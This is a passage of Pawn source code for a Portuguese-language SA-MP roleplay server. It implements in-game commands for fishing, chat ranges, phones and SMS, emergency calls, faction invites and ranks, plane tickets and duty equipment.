    new montante, string[128];

	if(!IsPlayerInRangeOfPoint(playerid, 2.0, oInfo[0][LotaX], oInfo[0][LotaY], oInfo[0][LotaZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás na zona de vender peixe");
    if(GetPlayerPeixes(playerid) <= 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens peixes para vender.");
    
    if(pObjects[playerid][Peixe_Corvina] != 0)
    {
        montante += PRECO_CORVINA * pObjects[playerid][Peixe_Corvina];
        pObjects[playerid][Peixe_Corvina] = 0;
	}
    if(pObjects[playerid][Peixe_Congro] != 0)
    {
        montante += PRECO_CONGRO * pObjects[playerid][Peixe_Congro];
        pObjects[playerid][Peixe_Congro] = 0;
	}
    if(pObjects[playerid][Peixe_Robalo] != 0)
    {
        montante += PRECO_ROBALO * pObjects[playerid][Peixe_Robalo];
        pObjects[playerid][Peixe_Robalo] = 0;
	}
    if(pObjects[playerid][Peixe_Sargo] != 0)
    {
        montante += PRECO_SARGO * pObjects[playerid][Peixe_Sargo];
        pObjects[playerid][Peixe_Sargo] = 0;
	}
    if(pObjects[playerid][Peixe_Goraz] != 0)
    {
        montante += PRECO_GORAZ * pObjects[playerid][Peixe_Goraz];
        pObjects[playerid][Peixe_Goraz] = 0;
	}
    if(pObjects[playerid][Peixe_Cavala] != 0)
    {
        montante += PRECO_CAVALA * pObjects[playerid][Peixe_Cavala];
        pObjects[playerid][Peixe_Cavala] = 0;
	}
    if(pObjects[playerid][Peixe_Dourada] != 0)
    {
        montante += PRECO_DOURADA * pObjects[playerid][Peixe_Dourada];
        pObjects[playerid][Peixe_Dourada] = 0;
	}
    if(pObjects[playerid][Peixe_Espada] != 0)
    {
        montante += PRECO_ESPADA * pObjects[playerid][Peixe_Espada];
        pObjects[playerid][Peixe_Espada] = 0;
	}

    GivePlayerMoneyEx(playerid, montante);
    
    format(string, sizeof(string), "Vendeste todos os teus peixes e recebeste %d$", montante);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:comprarisco(playerid, params[], help)
{
    new quantidade, string[128];
    
	if(!IsPlayerInRangeOfPoint(playerid, 2.0, oInfo[0][ComprarIscoX], oInfo[0][ComprarIscoY], oInfo[0][ComprarIscoZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás na zona de comprar isco");
    if(sscanf(params, "d", quantidade)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/comprarisco <quantidade>");
    if(quantidade <= 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Quantidade inválida.");
    
    GivePlayerMoneyEx(playerid, -(PRECO_ISCO*quantidade));
    pObjects[playerid][Isco] += quantidade;
    
    format(string, sizeof(string), "Compraste %d iscos por %d$", quantidade, PRECO_ISCO*quantidade);
    SendClientMessage(playerid, COLOR_INFO, string);
    
	return 1;
}

COMMAND:pescar(playerid, params[], help)
{
	new Float:plrX, Float:plrY, Float:plrZ;
	GetPlayerPos(playerid, plrX, plrY, plrZ);
	
    if(!IsPlayerInDynamicArea(playerid, zonaPescar)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás na área de pescar!");
    if(pObjects[playerid][CanaDePesca] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma cana de pesca!");
	if(pObjects[playerid][Isco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens isco!");
	if(GetPlayerPeixes(playerid) > 15) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já não tens mais espaço para guardares o peixe!");
	if(PodePescarB[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Ainda não podes pescar!");
	if(GetPlayerAnimationIndex(playerid))
	{
		new animlib[32];
		new animname[32];
		
		GetAnimationName(GetPlayerAnimationIndex(playerid), animlib, 32, animname, 32);
		
		if(strcmp(animlib, "SWIM", true) == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tens de estar num barco para pescares!");
	}
	
	TogglePlayerControllable(playerid, 0);
	ApplyAnimation(playerid, "SWORD", "sword_block", 50.0, 0, 1, 0, 1, 1);
	CanaDePescaObjeto[playerid] = SetPlayerAttachedObject(playerid, 0, 18632, 6,0.079376, 0.037070, 0.007706, 181.482910, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
	ApplyAnimation(playerid, "SWORD", "sword_block", 50.0, 0, 1, 0, 1, 1);
	
	SetTimerEx("Pescar", 8000, false, "i", playerid);
	PodePescarB[playerid] = false;
	pObjects[playerid][Isco]--;
	
	return 1;
}

COMMAND:sussurrar(playerid, params[], help)
{
	new mensagem[128];

    if(sscanf(params, "s[128]", mensagem)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/sussurrar <texto>");
	
	ProxDetectorChat(2.0, playerid, mensagem, CHAT_TYPE_SUSSURRAR);

	return 1;
}

COMMAND:gritar(playerid, params[], help)
{
	new mensagem[128];

    if(sscanf(params, "s[128]", mensagem)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/gritar <texto>");

	ProxDetectorChat(35.0, playerid, mensagem, CHAT_TYPE_GRITAR);

	return 1;
}

COMMAND:baixo(playerid, params[], help)
{
	new mensagem[128];

    if(sscanf(params, "s[128]", mensagem)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/baixo <texto>");

	ProxDetectorChat(5.0, playerid, mensagem, CHAT_TYPE_BAIXO);

	return 1;
}

COMMAND:wtfreq(playerid, params[], help)
{
	new freq, string[128];

    if(sscanf(params, "d", freq)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/wtfreq <frequência>");
	if(pObjects[playerid][WalkieTalkie] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhum Walkie Talkie");
	if(freq < 0 || freq > 1000) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Frequência inválida (0-1000)!");
	
	format(string, sizeof(string), "Alteraste a freqência do teu walkie talkie para %d.", freq);
	SendClientMessage(playerid, COLOR_INFO, string);
    PlayerActionMessage(playerid, 15.0, "carrega em algumas teclas do seu walkie talkie, alterando a frequência.");
    
    pObjects[playerid][WalkieTalkieFreq] = freq;

	return 1;
}

COMMAND:wt(playerid, params[], help)
{
	new mensagem[128];

    if(sscanf(params, "s[128]", mensagem)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/wt <texto>");
	if(pObjects[playerid][WalkieTalkie] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhum Walkie Talkie");
	
	WalkieTalkieMessage(playerid, mensagem, pObjects[playerid][WalkieTalkieFreq]);
	ProxDetectorChat(25.0, playerid, mensagem, CHAT_TYPE_NORMAL);

	return 1;
}

COMMAND:amarrar(playerid, params[], help)
{
	new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/amarrar <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
	if(pObjects[playerid][Corda] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma corda");

    if(Amarrado[giveplayerid] == true)
    {
 		format(string, sizeof(string), "Desamarraste o jogador %s", GetPlayerNameEx(giveplayerid));
		SendClientMessage(playerid, COLOR_INFO, string);
		format(string, sizeof(string), "O jogador %s desamarrou-te", GetPlayerNameEx(playerid));
		SendClientMessage(giveplayerid, COLOR_INFO, string);

		PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "desamarra");
		
		Amarrado[giveplayerid] = false;
		TimerPuxarJogador[playerid] = SetTimerEx("JogadorPuxaJogador", 1000, true, "ii", playerid, giveplayerid);
    }
    else
    {
 		format(string, sizeof(string), "Amarraste o jogador %s", GetPlayerNameEx(giveplayerid));
		SendClientMessage(playerid, COLOR_INFO, string);
		format(string, sizeof(string), "O jogador %s amarrou-te", GetPlayerNameEx(playerid));
		SendClientMessage(giveplayerid, COLOR_INFO, string);

		PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "amarra");

		Amarrado[giveplayerid] = true;
		KillTimer(TimerPuxarJogador[playerid]);
    }

	return 1;
}

COMMAND:vendar(playerid, params[], help)
{
	new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/vendar <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
	if(pObjects[playerid][Venda] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma venda");
	
    if(Vendado[giveplayerid] == true)
    {
 		format(string, sizeof(string), "Desvendaste o jogador %s", GetPlayerNameEx(giveplayerid));
		SendClientMessage(playerid, COLOR_INFO, string);
		format(string, sizeof(string), "O jogador %s desvendou-te", GetPlayerNameEx(playerid));
		SendClientMessage(giveplayerid, COLOR_INFO, string);

		PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "retira a venda a");
		SetPlayerWeather(giveplayerid, 0);

		Vendado[giveplayerid] = false;
    }
    else
    {
 		format(string, sizeof(string), "Vendaste o jogador %s", GetPlayerNameEx(giveplayerid));
		SendClientMessage(playerid, COLOR_INFO, string);
		format(string, sizeof(string), "O jogador %s vendou-te", GetPlayerNameEx(playerid));
		SendClientMessage(giveplayerid, COLOR_INFO, string);
		
		PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "coloca uma venda a");
		SetPlayerWeather(giveplayerid, 500);
		
		Vendado[giveplayerid] = true;
    }

	return 1;
}

COMMAND:desligar(playerid, params[], help)
{
	if(ATelefonar[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a telefonar");
	if(AReceberChamada[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a receber nenhuma chamada");
	if(AFalarTele[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás numa chamada");

	SendClientMessage(playerid, COLOR_INFO, "Desligaste o telefone");
	SendClientMessage(AFalarPara[playerid], COLOR_INFO, "Desligaram o telefone");

	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
	SetPlayerSpecialAction(AFalarPara[playerid], SPECIAL_ACTION_STOPUSECELLPHONE);
	
	ATelefonar[playerid] = false;
	ATelefonar[AFalarPara[playerid]] = false;
	ATelefonarPara[playerid] = INVALID_PLAYER_ID;
	ATelefonarPara[AFalarPara[playerid]] = INVALID_PLAYER_ID;
	
	AReceberChamada[playerid] = false;
	AReceberChamada[AFalarPara[playerid]] = false;
	AReceberChamadaDe[playerid] = INVALID_PLAYER_ID;
	AReceberChamadaDe[AFalarPara[playerid]] = INVALID_PLAYER_ID;
	
	AFalarTele[playerid] = false;
	AFalarTele[AFalarPara[playerid]] = false;
	AFalarPara[playerid] = INVALID_PLAYER_ID;
	AFalarPara[AFalarPara[playerid]] = INVALID_PLAYER_ID;

	return 1;
}

COMMAND:atender(playerid, params[], help)
{
	if(ATelefonar[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Estás a telefonar");
	if(AReceberChamada[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a receber nenhuma chamada");
	if(AFalarTele[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás numa chamada");
	if(!IsPlayerConnected(AReceberChamadaDe[playerid]))
	{
		ATelefonar[playerid] = false;
		ATelefonar[AFalarPara[playerid]] = false;
		ATelefonarPara[playerid] = INVALID_PLAYER_ID;
		ATelefonarPara[AFalarPara[playerid]] = INVALID_PLAYER_ID;

		AReceberChamada[playerid] = false;
		AReceberChamada[AFalarPara[playerid]] = false;
		AReceberChamadaDe[playerid] = INVALID_PLAYER_ID;
		AReceberChamadaDe[AFalarPara[playerid]] = INVALID_PLAYER_ID;

		AFalarTele[playerid] = false;
		AFalarTele[AFalarPara[playerid]] = false;
		AFalarPara[playerid] = INVALID_PLAYER_ID;
		AFalarPara[AFalarPara[playerid]] = INVALID_PLAYER_ID;
		
	    return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador já não está online");
	}
	
	pInfo[playerid][Saldo] -= PRECO_TELEFONAR;
	bInfo[pInfo[playerid][Rede]][Bank] += PRECO_TELEFONAR;
	
	AFalarTele[playerid] = true;
	AFalarTele[AFalarPara[playerid]] = true;
	AFalarPara[AFalarPara[playerid]] = playerid;
	
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
	
	return 1;
}

COMMAND:emergencia(playerid, params[], help)
{
	if(Emergencia[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás numa emergência");
	
	new mensagem[128], string[128];

    if(sscanf(params, "s[128]", mensagem)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/emergencia <mensagem>");

	switch(EmergenciaNum[playerid])
	{
		case 112:
		{
		    format(string, sizeof(string), "[EMERGÊNCIAS:] {FFFFFF}Obrigado por nos contactar. O socorro está a caminhho.");
		    SendClientMessage(playerid, COLOR_CHAT, string);
		    
		    format(string, sizeof(string), "[EMERGÊNCIAS:] {FFFFFF}SOS recebido: %s", mensagem);
		    
      		foreach(new i : Player)
		    {
		        if(pInfo[i][Faction] == 0) continue;
		        if(fInfo[pInfo[i][Faction]][Type] != F_MEDICOS && fInfo[pInfo[i][Faction]][Type] != F_POLICIA) continue;
		        
		        SendClientMessage(i, COLOR_OWNER, string);
		    }
		}
		case 666:
		{
		    format(string, sizeof(string), "[OFICINA:] {FFFFFF}Obrigado por nos contactar. A ajuda está a caminho.");
		    SendClientMessage(playerid, COLOR_CHAT, string);

		    format(string, sizeof(string), "[OFICINA:] {FFFFFF}Chamada recebida: %s", mensagem);

      		foreach(new i : Player)
		    {
		        if(pInfo[i][Faction] == 0) continue;
		        if(fInfo[pInfo[i][Faction]][Type] != F_MECANICOS) continue;

		        SendClientMessage(i, COLOR_CHAT, string);
		    }
		}
	}
	
	Emergencia[playerid] = false;
	EmergenciaNum[playerid] = 0;
	
	return 1;
}

COMMAND:telefonar(playerid, params[], help)
{
	new numero, string[128], giveplayerid = INVALID_PLAYER_ID;

    if(sscanf(params, "d", numero)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/telefonar <número>");
    if(pObjects[playerid][Telemovel] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Nâo tens telemóvel");
    if(pInfo[playerid][Morto] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Estás gravemente ferido");
    
    foreach(new i : Player)
    {
        if(pInfo[i][NumeroTelemovel] != numero) continue;
        else
		{
		    giveplayerid = i;
		    break;
		}
    }
    if(numero == 112 || numero == 666)
    {
        switch(numero)
        {
            case 112:
            {
                Emergencia[playerid] = true;
                EmergenciaNum[playerid] = 112;
                
                SendClientMessage(playerid, COLOR_INFO, "[HOSPITAL:] {FFFFFF}Explique a sua emergência. ((usa /emergencia [msg]))");
            }
            case 666:
            {
                Emergencia[playerid] = true;
                EmergenciaNum[playerid] = 666;

                SendClientMessage(playerid, COLOR_INFO, "[OFICINA:] {FFFFFF}Qual é o problema? ((usa /emergencia [msg]))");
            }
        }
    }
    else
    {
	    if(giveplayerid == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	    if(pInfo[playerid][Saldo] < PRECO_TELEFONAR) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	    if(ATelefonar[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás numa chamada");
	    if(AReceberChamada[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás numa chamada");
	    if(AFalarTele[giveplayerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Linha ocupada");
	    
		format(string, sizeof(string), "{FFFF00}Estás a ligar para o número {FF9900}%s", pInfo[giveplayerid][NumeroTelemovel]);
		SendClientMessage(playerid, COLOR_INFO, string);
		
	    PlayerActionMessage(playerid, 15.0, "carrega em algumas teclas do seu telemóvel.");

	    SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);

		format(string, sizeof(string), "{FFFF00}Estás a receber uma chamada de {FF9900}%s {FFFFFF}(/atender)", pInfo[playerid][NumeroTelemovel]);
		SendClientMessage(giveplayerid, COLOR_INFO, string);
	    PlayerActionMessage(giveplayerid, 15.0, "sente o telemóvel a vibrar.");

	    ATelefonar[playerid] = true;
	    ATelefonarPara[playerid] = giveplayerid;

	    AReceberChamada[giveplayerid] = true;
	    AReceberChamadaDe[giveplayerid] = playerid;
	    
		pInfo[playerid][Saldo] -= PRECO_TELEFONAR;
    }

	return 1;
}

COMMAND:sms(playerid, params[], help)
{
	new numero, mensagem[128], string[128], name[24], giveplayerid = INVALID_PLAYER_ID;

    if(sscanf(params, "ds[128]", numero, mensagem)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/sms <número> <mensagem>");
    if(pObjects[playerid][Telemovel] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Nâo tens telemóvel");
    foreach(new i : Player)
    {
        if(pInfo[i][NumeroTelemovel] != numero) continue;
        else
		{
		    giveplayerid = i;
		    break;
		}
    }
    if(giveplayerid == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    if(pInfo[playerid][Saldo] < PRECO_SMS) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
    
	pInfo[playerid][Saldo] -= PRECO_SMS;
	bInfo[pInfo[playerid][Rede]][Bank] += PRECO_SMS;
	
	if(IsAmigo(giveplayerid, playerid) == 1 || AdminDuty[playerid] == true)
	{
		format(name, sizeof(name), "%s", GetPlayerNameEx(playerid));
		
		format(string, sizeof(string), "{FFFF00}Mensagem enviada para [{52E3BA}%d{FFFF00}]: {FF9900}%s", pInfo[giveplayerid][NumeroTelemovel], mensagem);
		SendClientMessage(playerid, COLOR_INFO, string);
	    PlayerActionMessage(playerid, 15.0, "carrega em algumas teclas do seu telemóvel.");
	}
	else
	{
		format(string, sizeof(string), "{FFFF00}Nova mensagem de [{52E3BA}%d{FFFF00}]: {FF9900}%s", pInfo[playerid][NumeroTelemovel], mensagem);
		SendClientMessage(giveplayerid, COLOR_INFO, string);
    	PlayerActionMessage(giveplayerid, 15.0, "sente o telemóvel a vibrar.");
	}

	return 1;
}

COMMAND:ajudaleader(playerid, params[], help)
{
    if(pInfo[playerid][Faction] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma faction");
	if(pInfo[playerid][FactionRank] != 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és faction leader!");

	SendClientMessage(playerid, COLOR_CHAT, "[FACTION LEADER]: {FFFFFF}/convidar - /expulsar - /mudarrank");

	return 1;
}

COMMAND:mudarrank(playerid, params[], help)
{
	new giveplayerid, rank, string[128];

    if(sscanf(params, "dd", giveplayerid, rank)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/mudarrank <playerid> <rank>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
	if(pInfo[giveplayerid][Faction] != 0 && pInfo[giveplayerid][Faction] != pInfo[playerid][Faction]) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador está numa faction");
	if(pInfo[playerid][FactionRank] != 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és Faction Leader");
	if(pInfo[playerid][Faction] != pInfo[giveplayerid][Faction]) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não é da tua faction!");
	if(rank <= 0 || rank > 6) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Rank inválido (1-6)");

	format(string, sizeof(string), "Puseste o jogador %s a rank (%d) %s!", GetPlayerNameEx(giveplayerid), rank, GetRankName(pInfo[giveplayerid][Faction], pInfo[giveplayerid][FactionRank]));
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O jogador %s pôs-te a rank (%d) %s!", GetPlayerNameEx(playerid), rank, GetRankName(pInfo[giveplayerid][Faction], pInfo[giveplayerid][FactionRank]));
	SendClientMessage(giveplayerid, COLOR_INFO, string);

	pInfo[giveplayerid][FactionRank] = rank;

	return 1;
}

COMMAND:expulsar(playerid, params[], help)
{
	new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/expulsar <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
	if(pInfo[giveplayerid][Faction] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não está numa faction");
	if(pInfo[playerid][FactionRank] != 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és Faction Leader");
	if(pInfo[playerid][Faction] != pInfo[giveplayerid][Faction]) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não é da tua faction!");

	format(string, sizeof(string), "Expulsaste o jogador %s da faction!", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "Foste expulso da tua faction por %s!", GetPlayerNameEx(playerid));
	SendClientMessage(giveplayerid, COLOR_INFO, string);

	pInfo[giveplayerid][Faction] = 0;
	pInfo[giveplayerid][FactionRank] = 0;

	return 1;
}

COMMAND:convidar(playerid, params[], help)
{
	new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/convidar <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
	if(pInfo[giveplayerid][Faction] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador está numa faction");
	if(pInfo[playerid][FactionRank] != 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és Faction Leader");
	
	format(string, sizeof(string), "Convidaste o jogador %s para a faction!", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "Foste convidado pelo jogador %s para entrares na faction %s! (/aceitar)", GetPlayerNameEx(playerid), fInfo[pInfo[playerid][Faction]][Nome]);
	SendClientMessage(giveplayerid, COLOR_INFO, string);
	
	ConvidadorFac[giveplayerid] = playerid;
	ConviteFac[giveplayerid] = true;
    
	return 1;
}

COMMAND:aceitar(playerid, params[], help)
{
	if(ConviteFac[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhum convite pendente!");
	if(pInfo[playerid][Faction] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás numa faction");
	
	new string[128];
	
	pInfo[playerid][Faction] = pInfo[ConvidadorFac[playerid]][Faction];
	pInfo[playerid][FactionRank] = fInfo[pInfo[playerid][Faction]][JoinRank];
	
	format(string, sizeof(string), "Aceitaste o convite para a faction %s!", fInfo[pInfo[playerid][Faction]][Nome]);
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O jogador %s aceitou o convite para a faction!", GetPlayerNameEx(ConvidadorFac[playerid]), fInfo[pInfo[playerid][Faction]][Nome]);
	SendClientMessage(ConvidadorFac[playerid], COLOR_INFO, string);
	
	pInfo[playerid][Emprego] = 0;
	pInfo[playerid][EmpregoNivel] = 0;
	pInfo[playerid][Rotas] = 0;
	
	ConvidadorFac[playerid] = INVALID_PLAYER_ID;
	ConviteFac[playerid] = false;
	
	return 1;
}

COMMAND:comprarbilhete(playerid, params[], help)
{
	if(!PlayerToPoint(2.0, playerid, oInfo[0][AeroportoX], oInfo[0][AeroportoY], oInfo[0][AeroportoZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás no sítio de comprar os bilhetes");
	if(GetPlayerMoneyEx(playerid) < 100) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	
	GivePlayerMoneyEx(playerid, -100);
	
	SendClientMessage(playerid, COLOR_INFO, "Compraste um bilhete de avião! Boa viagem!");
	SetPlayerPosEx(playerid, 2.384830, 33.103397, 1199.849976);
	
	SetTimerEx("Aviao", 120000, false, "i", playerid);
	
	return 1;
}

COMMAND:ajudatrabalho(playerid, params[], help)
{
	new string[128];
	
	if(pInfo[playerid][Emprego] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Estás desempregado");
	
	SendClientMessage(playerid, COLOR_ORANGE, "_________________________[ AJUDA TRABALHO ]_________________________");
	format(string, sizeof(string), "Emprego: {FFFFFF}%s", jInfo[pInfo[playerid][Emprego]][Nome]);
	SendClientMessage(playerid, COLOR_CHAT, string);
	format(string, sizeof(string), "Salário por rota: {FFFFFF}%d$", pInfo[playerid][EmpregoNivel]*jInfo[pInfo[playerid][Emprego]][RotaSalario]);
	SendClientMessage(playerid, COLOR_CHAT, string);
	format(string, sizeof(string), "Salário: {FFFFFF}%d$", jInfo[pInfo[playerid][Emprego]][Salario]);
	SendClientMessage(playerid, COLOR_CHAT, string);
	format(string, sizeof(string), "Nível: {FFFFFF}%d", pInfo[playerid][EmpregoNivel]);
	SendClientMessage(playerid, COLOR_CHAT, string);
	format(string, sizeof(string), "Rotas: {FFFFFF}%d", pInfo[playerid][Rotas]);
	SendClientMessage(playerid, COLOR_CHAT, string);
	format(string, sizeof(string), "Tempo de espera: {FFFFFF}%d minutos", pInfo[playerid][TempoRota]);
	SendClientMessage(playerid, COLOR_CHAT, string);
	SendClientMessage(playerid, COLOR_ORANGE, "_____________________________________________________________________");

	return 1;
}

COMMAND:duty(playerid, params[], help)
{
	if(pInfo[playerid][Faction] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma faction");
	if(fInfo[pInfo[playerid][Faction]][UseDuty] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}A tua faction não tem o Duty ativo");
 	if(!IsPlayerInRangeOfPoint(playerid, 8.0, fInfo[pInfo[playerid][Faction]][DutyX], fInfo[pInfo[playerid][Faction]][DutyY], fInfo[pInfo[playerid][Faction]][DutyZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás na posição de entrar em Duty");

	if(FactionDuty[playerid] == false)
	{
		switch(fInfo[pInfo[playerid][Faction]][Type])
		{
			case F_POLICIA:
			{
	            PlayerActionMessage(playerid, 15.0, "abre o cacifo e retira a farda e as armas.");
	            SetPlayerColor(playerid, COLOR_POLICIA);
	            
	            GivePlayerWeapon(playerid, 3, 100);
				GivePlayerWeapon(playerid, 24, 100);
			}
			case F_MEDICOS:
			{
			    PlayerActionMessage(playerid, 15.0, "tira a bata do cacifo e veste-a.");
			    SetPlayerColor(playerid, COLOR_MEDICOS);
			}
			case F_MECANICOS:
			{
			    PlayerActionMessage(playerid, 15.0, "tira o fato de macaco do cacifo e veste-o.");
			    SetPlayerColor(playerid, COLOR_MECANICOS);
			}
			case F_NEWS:
			{
			    PlayerActionMessage(playerid, 15.0, "pega na câmara fotográfica e num bloco de notas e guarda-as na mochila.");
			    SetPlayerColor(playerid, COLOR_NEWS);
			    
			    GivePlayerWeapon(playerid, 43, 1000);
			}
			case F_GOVERNO:
			{
			    PlayerActionMessage(playerid, 15.0, "abre o cacifo, veste o fato e pega na arma.");
			    SetPlayerColor(playerid, COLOR_GOVERNO);
			}
			case F_DROGAS:
			{
                PlayerActionMessage(playerid, 15.0, "pega em alguns sacos de droga e coloca-os na mochila.");
                SetPlayerColor(playerid, COLOR_WHITE);
			}
			case F_MAFIA:
			{
                PlayerActionMessage(playerid, 15.0, "pega em algumas armas e coloca-as na mochila.");
                SetPlayerColor(playerid, COLOR_WHITE);
			}
			case F_SR:
			{
